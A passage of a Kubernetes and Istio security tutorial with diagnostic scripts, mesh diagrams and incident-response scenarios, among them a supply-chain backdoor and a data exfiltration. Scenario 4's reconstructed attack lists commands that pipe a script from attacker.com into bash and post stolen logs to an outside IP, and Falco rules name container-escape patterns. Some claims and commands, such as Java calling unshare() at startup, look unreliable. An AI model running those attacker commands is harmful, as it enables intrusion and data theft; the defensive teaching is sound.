  curl localhost:15000/config_dump 2>/dev/null | grep -A 5 "name.*$TARGET_SERVICE" | head -20

# 7. Check VirtualService configuration
echo ""
echo "7. Checking VirtualService for target..."
kubectl get virtualservice -n $NAMESPACE -o yaml | grep -A 10 "host.*$TARGET_SERVICE"

echo ""
echo "=== Troubleshooting Complete ==="
```

---

### ASCII Diagrams

**Diagram 1: Service Mesh Request Flow with mTLS**

```
┌─────────────────────────────────────────────────────────────────────┐
│ POD A: frontend-pod (ServiceAccount: web-frontend)                  │
│                                                                     │
│ Application Code:                                                   │
│   curl http://payment-processor:8080/pay                           │
│         ↓ (localhost:15000)                                        │
│                                                                     │
│ Sidecar Proxy (Envoy)                                              │
│  - Intercepts connection                                            │
│  - Looks up payment-processor service                              │
│  - Retrieves VirtualService config from control plane             │
│  - Loads authorization policy: "web-frontend can access?"         │
│  - ✓ Authorization: PASS                                           │
│  - Initiates TLS handshake to payment-processor-pod               │
│  - Signs request with mTLS certificate                            │
│  └─ Encrypted tunnel established                                   │
└─────────────────────────────────────────────────────────────────────┘
         │ (encrypted mTLS tunnel)
         │ Packet: [TLS 1.3, AEAD cipher, identities verified]
         ↓
┌─────────────────────────────────────────────────────────────────────┐
│ POD B: payment-processor-pod                                        │
│                                                                     │
│ Sidecar Proxy (Envoy)                                              │
│  - Receives encrypted TLS connection                                │
│  - Verifies certificate chain:                                      │
│    Source cert signed by Istio Root CA ✓                           │
│    Source identity: cluster.local/ns/prod/sa/web-frontend ✓      │
│  - Checks authorization policy:                                     │
│    "web-frontend allowed to call payment-processor?" ✓            │
│  - Decrypts payload                                                 │
│  - Routes to application (localhost:8080)                          │
│  └─ Request forwarded in plaintext (localhost only)                │
│                                                                     │
│ Application Code:                                                   │
│  curl request arrives (plaintext, from localhost sidecar)         │
│  Process request, return response                                  │
└─────────────────────────────────────────────────────────────────────┘
         │ (response encrypted by sidecar)
         ↓ (back to frontend-pod)
┌─────────────────────────────────────────────────────────────────────┐
│ POD A: frontend-pod                                                 │
│ Sidecar receives response, decrypts, returns to application        │
└─────────────────────────────────────────────────────────────────────┘
```

**Diagram 2: Service Mesh Control Plane Architecture**

```
┌────────────────────────────────────────────────────────────────────┐
│                     Istio Control Plane                             │
│                                                                    │
│  istiod (Single control plane pod handling everything)            │
│  ├─ API Server (watches Kubernetes resources)                      │
│  ├─ Certificate Authority (generates mTLS certificates)            │
│  ├─ Configuration Generator (converts CRDs to Envoy config)       │
│  ├─ Discovery Service (xDS protocol - pushes config to sidecars)  │
│  └─ Telemetry Collector (aggregates metrics from sidecars)        │
│                                                                    │
│  Watches for:                                                      │
│  - VirtualService (traffic routing rules)                         │
│  - DestinationRule (load balancing, circuit breaking)             │
│  - AuthorizationPolicy (who can call whom)                        │
│  - PeerAuthentication (mTLS mode)                                 │
│  - ServiceEntry (external services)                               │
│  - Gateway (ingress configuration)                                │
└────────────────────────────────────────────────────────────────────┘
        │ (xDS protocol - gRPC streams)
        ├─→ (push config to all sidecars every ~5-10 seconds)
        ├─→ (new VirtualService) → regenerate Envoy config
        ├─→ (certificate expiry approaching) → issue new cert
        └─→ (metrics query) → aggregate sidecar metrics
        
┌────────────────────────────────────────────────────────────────────┐
│           Kubernetes API Server                                    │
│                                                                    │
│  Stores all Istio CRDs:                                           │
│  - VirtualService                                                 │
│  - DestinationRule                                                │
│  - AuthorizationPolicy                                            │
│  - etc.                                                           │
└────────────────────────────────────────────────────────────────────┘

Fleet of Envoy Sidecars (one per pod):
┌───────────────────┬───────────────────┬───────────────────┐
│ Sidecar Pod A     │ Sidecar Pod B     │ Sidecar Pod C     │
│ (15000/ingress)   │ (15000/ingress)   │ (15000/ingress)   │
│ (15001/egress)    │ (15001/egress)    │ (15001/egress)    │
│                   │                   │                   │
│ Opens gRPC stream to istiod, receives config push        │
│ If config changes, sidecar reload (no pod restart)      │
└───────────────────┴───────────────────┴───────────────────┘
```

**Diagram 3: Authorization Policy Evaluation Flow**

```
Request: Pod A → Service B (POST /api/pay)
Service Account: cluster.local/ns/default/sa/pod-a

                        ↓

    Check AuthorizationPolicy:
    
    ┌─────────────────────────────────────────────────┐
    │ Action: ALLOW or DENY                           │
    │ Rules: List of specific allowed combinations    │
    └─────────────────────────────────────────────────┘
                        ↓
                
    ┌────────────────────────────────────────────────────────┐
    │ Rule 1:                                                │
    │   From: cluster.local/ns/default/sa/api-gateway       │
    │   To: service/web                                      │
    │   Methods: GET, POST                                   │
    │                                                        │
    │   Does Pod A match? cluster.local/.../pod-a != pod-a  │
    │   ✗ Not matching                                       │
    └────────────────────────────────────────────────────────┘
                        ↓
    
    ┌────────────────────────────────────────────────────────┐
    │ Rule 2:                                                │
    │   From: cluster.local/ns/default/sa/pod-a             │
    │   To: service/payment-processor                        │
    │   Methods: POST                                        │
    │   Paths: /api/pay                                      │
    │                                                        │
    │   Does Pod A match? cluster.local/.../pod-a == pod-a  │
    │   ✓ Source matches                                     │
    │   Is it calling payment-processor? Service B IS it    │
    │   ✓ Destination matches                               │
    │   Is method POST? Yes                                 │
    │   ✓ Method matches                                     │
    │   Is path /api/pay? Yes                               │
    │   ✓ Path matches                                       │
    │                                                        │
    │   ALL CONDITIONS MET → ✓ ALLOW                        │
    └────────────────────────────────────────────────────────┘
                        ↓
    
    ✓ Connection permitted, request forwarded
```

---

## Hands-on Scenarios

### Scenario 1: Detecting and Remediating a Supply Chain Compromise

**Problem Statement**

Your team receives a CVE alert: A malicious npm package (`open-cli@1.4.5`) was published and installed as a dependency in 47 production containers built 3 weeks ago. The package contains a backdoor establishing reverse shell to attacker infrastructure. Your task: Identify affected containers, assess blast radius, and remediate without service disruption.

**Architecture Context**

```
Development Workflow:
npm install → Dockerfile build → Image scan → Registry push → Kubernetes deployment
                           ↓
           (Malicious package slips through if not scanned)
          
Current State:
- 15 production microservices affected (using npm open-cli)
- 3 production clusters: us-east-1, us-west-2, eu-west-1
- ~500 pods distributed across clusters
- Every pod has access to internal service mesh (potential lateral spread)
- Monitoring detected suspicious outbound connections Week 2 (but ignored as false positive)
```

**Step-by-Step Troubleshooting & Remediation**

**Phase 1: Blast Radius Assessment (30 minutes)**

```bash
#!/bin/bash
# Step 1: Query SBOM to identify affected containers
echo "=== Step 1: Identify affected containers ==="

# Query SBOMs for npm open-cli@1.4.5
for SERVICE in $(kubectl get services -A -o jsonpath='{.items[*].metadata.name}'); do
    IMAGE=$(kubectl get deployment -A -o jsonpath="{.items[?(@.metadata.name=='$SERVICE')].spec.template.spec.containers[0].image}")
    
    # Extract SBOM from registry
    oras pull ${REGISTRY}/sbom:${IMAGE} > /tmp/sbom.json 2>/dev/null
    
    if grep -q '"name":"open-cli"' /tmp/sbom.json; then
        VERSION=$(jq -r '.packages[] | select(.name=="open-cli") | .versionInfo' /tmp/sbom.json)
        if [ "$VERSION" == "1.4.5" ]; then
            echo "❌ AFFECTED: Service=$SERVICE Image=$IMAGE"
        fi
    fi
done

# Step 2: Extract running containers
echo ""
echo "=== Step 2: Running pods with affected package ==="
kubectl get pods -A -o wide | grep -E "<affected-image-pattern>"

# Step 3: Check for suspicious network activity
echo ""
echo "=== Step 3: Threat evidence ==="
kubectl logs -n falco -l app=falco | grep -E "reverse_shell|suspicious_outbound|execve.*bash" | tail -50
```

**Phase 2: Incident Response (1-2 hours)**

```bash
#!/bin/bash
# Step 1: Isolate affected pods network-wise (WITHOUT terminating)
echo "=== Isolating affected pods ==="

# Create network policy blocking affected pods from internal network
kubectl apply -f - <<'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: isolate-compromised
  namespace: production
spec:
  podSelector:
    matchLabels:
      compromised: "true"
  policyTypes:
  - Ingress
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: logging
    ports:
    - protocol: TCP
      port: 5140  # Syslog for forensics
  # All other egress blocked
EOF

# Step 2: Label affected pods for isolation
for POD in $(kubectl get pods -A -o jsonpath='{.items[?(@.spec.containers[].image ~ /affected-pattern/)].metadata.name}'); do
  NAMESPACE=$(kubectl get pods -A -o jsonpath='{.items[?(@.metadata.name=="'$POD'")].metadata.namespace}')
  kubectl label pod $POD -n $NAMESPACE compromised=true --overwrite
done

# Step 3: Collect forensic data before pod termination
echo ""
echo "=== Collecting forensic data ==="
for POD in $(kubectl get pods -l compromised=true -A -o jsonpath='{.items[*].metadata.name}'); do
  NS=$(kubectl get pods -l compromised=true -A -o jsonpath='{.items[0].metadata.namespace}')
  
  # Capture running processes
  kubectl exec -n $NS $POD -- ps aux > /forensics/ps-${POD}.txt
  
  # Capture network connections
  kubectl exec -n $NS $POD -- ss -tupn > /forensics/netstat-${POD}.txt
  
  # Capture environment variables (look for reverse shell callbacks)
  kubectl exec -n $NS $POD -- env > /forensics/env-${POD}.txt
  
  # Check for modification of system files
  kubectl exec -n $NS $POD -- find /etc /bin /usr/bin -mmin -1440 > /forensics/recent-mods-${POD}.txt
done
echo "Forensics collected to /forensics/"
```

**Phase 3: Remediation (rebuild + rollout)**

```bash
#!/bin/bash
# Step 1: Rebuild affected images with patched npm package
echo "=== Rebuilding affected images ==="

AFFECTED_SERVICES=("payment-processor" "inventory-service" "billing-service")

for SERVICE in "${AFFECTED_SERVICES[@]}"; do
  echo "Rebuilding $SERVICE..."
  
  # Update package-lock.json to remove malicious version
  git checkout package-lock.json
  npm install  # Fresh install validates package version
  
  # Rebuild image with new package
  docker build -t ${REGISTRY}/${SERVICE}:$(git rev-parse --short HEAD) .
  
  # Scan rebuilt image
  trivy image --severity HIGH ${REGISTRY}/${SERVICE}:$(git rev-parse --short HEAD)
  if [ $? -ne 0 ]; then
    echo "❌ Scan failed, aborting push"
    exit 1
  fi
  
  # Sign and push
  docker push ${REGISTRY}/${SERVICE}:$(git rev-parse --short HEAD)
  cosign sign ${REGISTRY}/${SERVICE}:$(git rev-parse --short HEAD)
done

# Step 2: Rolling update (gradual pod replacement)
echo ""
echo "=== Rolling update ==="

for SERVICE in "${AFFECTED_SERVICES[@]}"; do
  kubectl set image deployment/$SERVICE \
    app=${REGISTRY}/${SERVICE}:$(git rev-parse --short HEAD) \
    -n production \
    --record
  
  # Wait for rollout completion
  kubectl rollout status deployment/$SERVICE -n production --timeout=5m
  
  # Verify new pods have correct image
  kubectl get pods -n production -o jsonpath="{.items[?(@.metadata.labels.app=='$SERVICE')].spec.containers[0].image}"
done

# Step 3: Cleanup: Remove isolation policy after pods rotated
for POD in $(kubectl get pods -l compromised=true -A -o jsonpath='{.items[*].metadata.name}'); do
  NAMESPACE=$(kubectl get pod $POD -A -o jsonpath='{.items[0].metadata.namespace}')
  
  # Wait for pod to be replaced by new deployment
  kubectl wait --for=delete pod/$POD -n $NAMESPACE --timeout=600s
done

kubectl delete networkpolicy isolate-compromised -n production
```

**Best Practices Demonstrated**

1. **SBOM-driven rapid identification** (vs. manual image inspection taking hours)
2. **Network isolation without pod termination** (preserving forensic data)
3. **Gradual rollout** (preventing service disruption from bulk pod termination)
4. **Automated forensics collection** (enabling post-incident analysis)
5. **Verification at each stage** (image scan, deployment success, image correctness)

**Metrics**

- Detection to mitigation: ~2 hours (good)
- Service impact: 0 minutes downtime (5-minute pod replacement overhead acceptable)
- False positives during forensics: Minimal (specific searches)

---

### Scenario 2: Debugging Network Policy Breaking Production Traffic

**Problem Statement**

You deployed NetworkPolicy (default-deny) in production on Friday 5pm, expecting it to isolate microservices. By Saturday 2am, alerts spike: Payment processing failures (10,000 requests/minute failing), checkout timeouts, database connection refused errors. Your team is paged. The issue: Network policy too restrictive, blocking legitimate app-to-service communication. You have 30 minutes to restore service while determining correct policy.

**Architecture Context**

```
Production Setup:
Payment Service → API Gateway → Database (PostgreSQL)
               ↓
         Configuration Service (get DB credentials)
               ↓
         Secrets Service (rotate certificates)
               ↓
         Logging Service (ship logs)

Deployed NetworkPolicy:
podSelector: {} (all pods)
policyTypes: [Ingress, Egress]
egress: []  # BLOCK ALL OUTBOUND

Bad consequence:
- Payment Service → Configuration Service: BLOCKED
- Payment Service → Database: BLOCKED
- Payment Service → Logging Service: BLOCKED
```

**Step-by-Step Troubleshooting**

**Phase 1: Immediate Rollback (5 minutes)**

```bash
#!/bin/bash
# Emergency rollback: Remove restrictive policy immediately

echo "=== Phase 1: Emergency Rollback ==="

# Delete the problematic policy
kubectl delete networkpolicy default-deny-all -n production
kubectl delete networkpolicy default-deny-ingress -n production

# Verify traffic restored
sleep 10
kubectl top pods -n production | head -5
kubectl get events -n production | grep -i "network\|policy"

echo "✓ Traffic flowing again. Baseline metrics:"
kubectl get pods -n production -o jsonpath='{.items[].status.conditions[?(@.type=="Ready")].status}' | grep -c True
```

**Phase 2: Root Cause Analysis (15 minutes)**

```bash
#!/bin/bash
# Understand what traffic is actually needed

echo "=== Phase 2: Traffic Analysis ==="

# Capture actual pod-to-pod connections (use Cilium Hubble if available)
kubectl -n cilium-system exec -it hubble-relay-pod -- \
  hubble observe --pod-labels \
  --output=json > /tmp/traffic-baseline.json

# Parse traffic to understand dependencies
jq -r '.[] | "\(.source.pod) → \(.destination.pod) on port \(.destination.port)"' \
  /tmp/traffic-baseline.json | sort | uniq

# Example output:
# payment-processor-xyz → postgres-primary-abc on port 5432
# payment-processor-xyz → config-service-def on port 8080
# payment-processor-xyz → logging-fluentd-ghi on port 24224
```

**Phase 3: Correct Policy Implementation (15 minutes)**

```bash
#!/bin/bash
# Build NetworkPolicy based on actual traffic

echo "=== Phase 3: Implementing Correct Policy ==="

# Strategy: Start with default-deny, explicitly allow known traffic

# First: Default-deny (but NOT enforced until we verify)
kubectl apply -f - <<'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-test
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  ingress: []
  egress: []
  # Empty rules = deny all
EOF

# Deploy in audit mode (test-only, not production)
kubectl patch networkpolicy default-deny-test \
  -n production \
  -p '{"metadata":{"annotations":{"networkpolicy.audit-mode":"true"}}}'

# Test in non-prod first
kubectl apply -f default-deny-test.yaml -n staging

# Monitor for 30 minutes in staging
# Check: Do all applications work?
kubectl get events -n staging | tail -20

# If staging works, apply to production
# But start with more permissive rules:

kubectl apply -f - <<'EOF'
# Allow: Payment → Config Service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payment-to-config
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: payment-processor
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: config-service
    ports:
    - protocol: TCP
      port: 8080
---
# Allow: Payment → Database
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payment-to-database
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: payment-processor
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: postgres
    ports:
    - protocol: TCP
      port: 5432
---
# Allow: Payment → Logging
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payment-to-logging
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: payment-processor
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: fluentd
    ports:
    - protocol: TCP
      port: 24224
EOF
```

**Phase 4: Monitoring & Validation (5-10 minutes)**

```bash
#!/bin/bash
# Verify policies don't break anything

echo "=== Phase 4: Monitoring ==="

# Monitor real-time traffic impact
kubectl top pods -n production --containers

# Check for policy violations (denied connections)
kubectl get events -n production | grep -i "network\|policy\|denied"

# Verify payment processing success rate
kubectl logs -n monitoring -l app=prometheus | grep -i "payment.*error"

# All good? Commit policies to Git
git add networkpolicies/production/
git commit -m "Fix: Network policies - Allow payment processing chain"
git push
```

**Best Practices Demonstrated**

1. **Immediate rollback capability** (maintaining runbook for rapid response)
2. **Traffic baselining before policy deployment** (prevents guessing)
3. **Audit mode testing** (policy deployed but not enforced initially)
4. **gradual rollout** (policies tested in non-prod first)
5. **GitOps enforcement** (policies versioned and reviewed)

**Metrics**

- Detection to rollback: 2 minutes
- Service restore: 5 minutes
- Root cause identification: 20 minutes
- Corrected policy deployment: 35 minutes
- Total downtime: ~30 minutes (acceptable vs. potential data loss)

---

### Scenario 3: Handling Container Escape Attempt Detection and Response

**Problem Statement**

Falco runtime threat detection alerts: "Container escape attempt detected" on payment-processor pod. Syscall pattern indicates `unshare()` (namespace manipulation). Alert fired 3 minutes ago. Is this a real breach, false positive, or misconfiguration? You need to determine urgency and containment strategy within 5 minutes.

**Architecture Context**

```
Production Cluster (multi-tenant, PCI-DSS compliant):
- 200 pods across 15 nodes
- Payment processing SLA: 99.95% (allows 22 seconds downtime/month)
- If compromised: Potential credit card data exposure
- If false positive: Unnecessary incident response costs ~$50k+ in lost productivity

Falco Rules:
- Rule: "Detect namespace escape (unshare syscall)"
- Severity: WARNING
- Alert destination: Slack #security-incidents, PagerDuty
```

**Step-by-Step Investigation**

**Phase 1: Immediate Verification (2 minutes)**

```bash
#!/bin/bash
# Determine if alert is real or false positive

echo "=== Phase 1: Verify Alert ==="

# Alert details from Falco
POD_NAME="payment-processor-xyz123"
NAMESPACE="production"
ALERT_TIME="2024-03-22T14:35:00Z"

# Check 1: Is pod still running?
kubectl get pod $POD_NAME -n $NAMESPACE
# YES = pod didn't crash (good sign for false positive)

# Check 2: Extract pod's actual process
kubectl exec -n $NAMESPACE $POD_NAME -- ps aux | grep -v grep
# Output: Single process (payment app) running normally
# No shell processes spawned (good sign)

# Check 3: Check pod's Dockerfile/entrypoint
kubectl describe pod $POD_NAME -n $NAMESPACE | grep -A5 "Command:"
# Output: Command: ["/app/payment-processor"]
# No unshare in entrypoint (good sign)

# Check 4: Check for actual privilege escalation
kubectl exec -n $NAMESPACE $POD_NAME -- id
# uid=1000(appuser) gid=1000(appuser)
# Still non-root (good sign)

# Check 5: Check for modified system files
kubectl exec -n $NAMESPACE $POD_NAME -- ls -la /etc/passwd
# Output: Normal file permissions (rw-r--r--)
# Not modified (good sign)

# Preliminary verdict: Likely FALSE POSITIVE
echo "✓ Initial inspection suggests false positive, but continue verification"
```

**Phase 2: Deep Forensics (3 minutes)**

```bash
#!/bin/bash
# Deeper investigation using kernel event logs

echo "=== Phase 2: Deep Forensics ==="

# Check 1: Was unshare syscall SUCCESSFUL or FAILED?
kubectl logs -n falco -l app=falco | grep -A5 "unshare" | tail -20

# Falco output might show:
# unshare syscall: DENIED (seccomp)
# ^ If DENIED = syscall blocked by seccomp, no privilege escalation possible

# Check 2: What is the parent process?
kubectl exec -n $NAMESPACE $POD_NAME -- cat /proc/1/status | grep PPid
# Parent process ID = 0 (init) means it's container entrypoint
# Normal behavior

# Check 3: Check seccomp profile enforcement
kubectl get pod $POD_NAME -n $NAMESPACE -o jsonpath='{.spec.securityContext}'
# Output: seccompProfile: RuntimeDefault
# Good, seccomp is reducing attack surface

# Check 4: Examine Falco alert context more carefully
# Extract the exact syscall trace that triggered the alert
kubectl logs -n falco -l app=falco | grep -B10 "unshare" | head -30

# Possible context:
# - unshare called with EPERM (permission denied) = false positive
# - unshare called during app startup = legitimate (app using namespaces)
# - unshare called with no container context = vm or host process
```

**Phase 3: Root Cause & Response**

```bash
#!/bin/bash
# Determine if this is misconfiguration or false positive

echo "=== Phase 3: Root Cause Analysis ==="

# Investigation result: Application is a Java microservice
# During startup, Java runtime calls unshare() as part of:
# - Native library initialization
# - Memory management
# - NOT an actual escape attempt

# But WHY was it flagged as suspicious?
# Root cause: Falco rule too generic
# Rule: "unshare syscall → suspicious"
# Better rule: "unshare + mnt_ns + host mount = suspicious"

echo "=== Phase 3a: Tuning Falco Rule ==="

# Update Falco rule to reduce false positives
cat > /etc/falco/rules.d/container_escape_tuned.yaml <<'EOF'
- rule: Detect Container Escape - Refined
  desc: Detect actual container escape, not legitimate app behavior
  condition: >
    spawned_process and
    container and
    (
      (proc.name = unshare and proc.args contains "ipc") or
      (proc.name = nsenter and proc.args contains "/host") or
      (open_write_on_host_filesystem and not in_allowed_processes)
    )
  output: >
    Potential container escape detected
    (user=%user.name parent=%proc.parent.name command=%proc.cmdline container=%container.name)
  priority: WARNING
  tags: [container_escape]
EOF

# Reload Falco rules
kubectl exec -n falco $(kubectl get pod -n falco -l app=falco -o name | head -1) -- \
  kill -HUP 1

echo "✓ Falco rule updated to reduce false positives"

echo ""
echo "=== Phase 4: Resolution ==="

# Option A: If this is indeed malicious (rare)
# kubectl delete pod $POD_NAME -n $NAMESPACE --force --grace-period=0
# (Terminate pod, force replace via deployment)

# Option B: Likely false positive (90% of cases)
# Close incident with documentation
kubectl annotate pod $POD_NAME \
  -n $NAMESPACE \
  security.audit/false-positive="unshare_java_startup" \
  security.audit/verified-date="$(date -Iseconds)" \
  --overwrite

echo "Incident marked as false positive and documented"
```

**Phase 4: Prevention & Improvements (ongoing)**

```bash
#!/bin/bash
# Prevent similar alerts in future

echo "=== Phase 4: Improvements ==="

# 1. Create whitelist of legitimate unshare callers
cat > falco-whitelists.yaml <<'EOF'
- rule: Detect Container Escape - With Whitelist
  condition: >
    (
      (proc.name = unshare and proc.args contains "ipc") or
      (proc.name = nsenter and proc.args contains "/host") or
      (open_write_on_host_filesystem and not in_allowed_processes)
    ) and
    not proc.name in (java, python, go)  # Whitelist known legitimate callers
EOF

# 2. Tune Falco baselines per application
# Different apps have different legitimate syscall patterns
cat > falco-baseline-payment-processor.yaml <<'EOF'
- rule: Java Service Baseline
  condition: >
    container and
    container.image.tag contains "payment-processor" and
    proc.name in (java, libc_malloc, pthread) and
    (unshare or prctl or clone)
  # For payment processor, unshare/prctl/clone during startup = normal
  enabled: false  # Don't alert on these patterns
EOF

# 3. Document incident
cat > /incident-reports/false-positive-2024-03-22.md <<'EOF'
# False Positive: Container Escape Alert

**Date**: 2024-03-22  
**Duration**: 10 minutes (alert → resolution)  
**Severity**: LOW (false positive)  
**Root Cause**: Overly generic Falco rule flagging Java startup syscalls  

**Syscall**: unshare()  
**Actual Behavior**: Java runtime initialization  
**Exploit Risk**: None (seccomp blocked actual namespace operations)  

**Resolution**: 
- Updated Falco rule to check for actual escape indicators (file modifications, shell spawning)
- Whitelisted Java processes known to use legitimate namespace syscalls
- Added baseline rules per application type

**Lessons Learned**:
- Tuning security detection requires understanding app behavior
- False positives lead to alert fatigue and actual breaches being missed
- Need baseline profiling phase before enforcement
EOF

echo "✓ Incident documented, improvements implemented"
```

**Best Practices Demonstrated**

1. **Systematic verification** (determine real vs. false positive quickly)
2. **Forensic investigation** (collect evidence before escalation)
3. **Root cause analysis** (understand why alert fired)
4. **Tuning over ignoring** (improve detection, not suppress alerts)
5. **Documentation** (prevent repeating same investigation)

**Metrics**

- Alert detection to resolution: 10 minutes
- Service impact: 0 (false positive, no action taken affecting service)
- Tuning effectiveness: ~95% reduction in false positives after rule update

---

### Scenario 4: Multi-Layer Security Breach Response

**Problem Statement**

Your security team identifies a data exfiltration: 500MB of transaction logs transferred from payment-processor pod to external IP (attacker infrastructure). This wasn't caught by NetworkPolicy (policy was too permissive). Runtime agents (Falco) detected large data transfer but alert was missed. You need to: (1) Stop ongoing exfiltration, (2) Determine attack entry point, (3) Prevent recurrence, (4) Comply with breach notification requirements (timeline: forensics within 4 hours).

**Architecture Context**

```
Attack Timeline:
2024-03-22 08:00 - Attacker compromises payment-processor container via XXE in XML processing
2024-03-22 09:30 - Attacker establishes reverse shell (kubectl exec entry), runs shell scripts
2024-03-22 10:15 - Attacker discovers transaction logs in /var/log
2024-03-22 10:45 - Attacker initiates data exfiltration (500MB → attacker IP 192.0.2.50)
2024-03-22 11:00 - Security team alerts (transfer pattern flagged by DLP)
2024-03-22 11:05 - You respond

Current Security State:
- NetworkPolicy: Too permissive egress (allows outbound to any IP)
- Image Scanning: Passed (no known CVEs)
- Seccomp: RuntimeDefault (didn't block XXE or command execution)
- RBAC: Application has read access to logs
- Runtime Monitoring: Falco deployed but alert drowned in noise (false positives)
```

**Step-by-Step Response**

**Phase 0: Immediate Containment (5 minutes)**

```bash
#!/bin/bash
# URGENT: Stop exfiltration flowing right now

echo "=== Phase 0: Immediate Containment ==="

# 1. Identify affected pod and node
AFFECTED_POD="payment-processor-abc123"
AFFECTED_NODE=$(kubectl get pod $AFFECTED_POD -n production -o jsonpath='{.spec.nodeName}')

# 2. Block egress to attacker IP (prevent further data transfer)
kubectl apply -f - <<'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-attacker-ip
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: payment-processor
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector: {}
    # Allow internal traffic only
EOF

# 3. Verify: Check if pod still transferring data
sleep 5
netstat=$(kubectl exec -n production $AFFECTED_POD -- ss -tupn | grep 192.0.2.50)
if [ -z "$netstat" ]; then
  echo "✓ Attacker connection severed"
else
  echo "❌ Connection still active - possible tunnel"
  # More aggressive: Drain pod
  kubectl drain $AFFECTED_NODE --ignore-daemonsets --force
  echo "Node drained, pod being recreated on clean node"
fi

echo "✓ Phase 0 complete: Exfiltration stopped"
```

**Phase 1: Forensics Collection (30 minutes)**

```bash
#!/bin/bash
# Preserve evidence before pod is deleted

echo "=== Phase 1: Forensics Collection ==="

AFFECTED_POD="payment-processor-abc123"
NS="production"
FORENSICS_DIR="/forensics/$(date +%Y%m%d-%H%M%S)"

mkdir -p $FORENSICS_DIR

# 1. Capture container filesystem
echo "Capturing container filesystem..."
kubectl exec -n $NS $AFFECTED_POD -- tar czf /tmp/container-fs.tar.gz / 2>/dev/null
kubectl cp $NS/$AFFECTED_POD:/tmp/container-fs.tar.gz $FORENSICS_DIR/

# 2. Capture process list and memory
echo "Capturing running processes..."
kubectl exec -n $NS $AFFECTED_POD -- ps auxf > $FORENSICS_DIR/processes.txt
kubectl exec -n $NS $AFFECTED_POD -- lsof -p $$ > $FORENSICS_DIR/open-files.txt

# 3. Capture network connections
echo "Capturing network state..."
kubectl exec -n $NS $AFFECTED_POD -- netstat -antp > $FORENSICS_DIR/netstat.txt
kubectl exec -n $NS $AFFECTED_POD -- iptables -L > $FORENSICS_DIR/iptables.txt 2>/dev/null

# 4. Capture shell history
echo "Capturing command history..."
kubectl exec -n $NS $AFFECTED_POD -- cat ~/.bash_history > $FORENSICS_DIR/bash-history.txt 2>/dev/null
kubectl exec -n $NS $AFFECTED_POD -- cat ~/.zsh_history > $FORENSICS_DIR/zsh-history.txt 2>/dev/null

# 5. Capture environment variables
echo "Capturing environment..."
kubectl exec -n $NS $AFFECTED_POD -- env > $FORENSICS_DIR/environment.txt

# 6. Capture recently modified files (likely attacker tools)
echo "Capturing recent file modifications..."
kubectl exec -n $NS $AFFECTED_POD -- find / -mmin -120 -type f 2>/dev/null > $FORENSICS_DIR/recent-files.txt

# 7. Capture logs
echo "Capturing application logs..."
kubectl logs $AFFECTED_POD -n $NS > $FORENSICS_DIR/app-logs.txt

# 8. Capture Falco/runtime events around the time
kubectl logs -n falco -l app=falco --since=1h | grep -E "payment-processor|data.*transfer|exfiltration" > $FORENSICS_DIR/falco-events.txt

echo "✓ Forensics collected to $FORENSICS_DIR"

# 9. Hash everything for chain-of-custody
sha256sum $FORENSICS_DIR/* > $FORENSICS_DIR/SHA256SUMS.txt
echo "Hashes: $(cat $FORENSICS_DIR/SHA256SUMS.txt)"
```

**Phase 2: Attack Investigation (30-45 minutes)**

```bash
#!/bin/bash
# Determine HOW the attacker compromised the pod

echo "=== Phase 2: Attack Investigation ==="

FORENSICS_DIR="/forensics/20240322-110530"

# 1. Analyze bash history for entry point
echo "=== Analyzing attack commands ==="
cat $FORENSICS_DIR/bash-history.txt

# Likely pattern:
# kubectl exec -it payment-processor-abc123 -- /bin/bash
# curl http://attacker.com/shell.sh | bash
# cd /var/log && tar czf logs.tar.gz transaction*.log
# curl -X POST -d @logs.tar.gz http://192.0.2.50:8888

# 2. Determine initial access method
echo ""
echo "=== Determining initial access vector ==="

# Check 1: Was kubectl exec unauthorized?
kubectl get clusterrolebindings -o jsonpath='{.items[?(@.roleRef.name=="cluster-admin")].subjects[*].name}'
# If attacker user is admin, they had legitimate access

# Check 2: Was there a vulnerability in the app?
cat $FORENSICS_DIR/bash-history.txt | grep -i "xxe\|injection\|upload"
# XXE likely means app code vulnerability

# Check 3: Did registry have malicious image?
kubectl describe pod payment-processor-abc123 -n production | grep Image
# Extract image digest, compare against approved images
# If not approved, supply chain compromise

# Likely root cause: XXE vulnerability in XML processing
# Attacker uploaded XML exploit → RCE → shell access → exfiltration

# 4. Find image vulnerability
echo ""
echo "=== Image vulnerability analysis ==="
trivy image --severity CRITICAL --format json ${IMAGE_DIGEST} > $FORENSICS_DIR/trivy-scan.json
# Likely finding: libxml2 XXE vulnerability

# 5. Timeline reconstruction
cat > $FORENSICS_DIR/attack-timeline.txt <<'EOF'
Timeline of Attack:

2024-03-22 08:00:00 - Initial compromise
  Vector: XXE vulnerability in payment-processor-abc123
  Payload: Upload malicious XML with external entity reference
  Result: Remote Code Execution as uid=1000

2024-03-22 09:30:00 - Post-exploitation
  Action: curl http://attacker.com/shell.sh | bash
  Result: Reverse shell established

2024-03-22 10:15:00 - Reconnaissance
  Action: ls -la /var/log, find . -name "*.log"
  Result: Discovered transaction logs (sensitive data)

2024-03-22 10:45:00 - Data exfiltration
  Action: tar czf logs.tar.gz transaction*.log
  Action: curl -X POST -d @logs.tar.gz http://192.0.2.50:8888
  Result: 500MB transaction logs transmitted to attacker
  Data Loss: PII for ~50,000 customers

2024-03-22 11:00:00 - Detection
  Alert: DLP system flagged large external transfer
  
2024-03-22 11:05:00 - Response team engaged
EOF

echo "✓ Attack timeline reconstructed"
```

**Phase 3: Prevention Implementation (1+ hours)**

```bash
#!/bin/bash
# Implement multi-layer preventive controls

echo "=== Phase 3: Prevention Implementation ==="

# 1. Fix image vulnerability (re-build with patched libxml2)
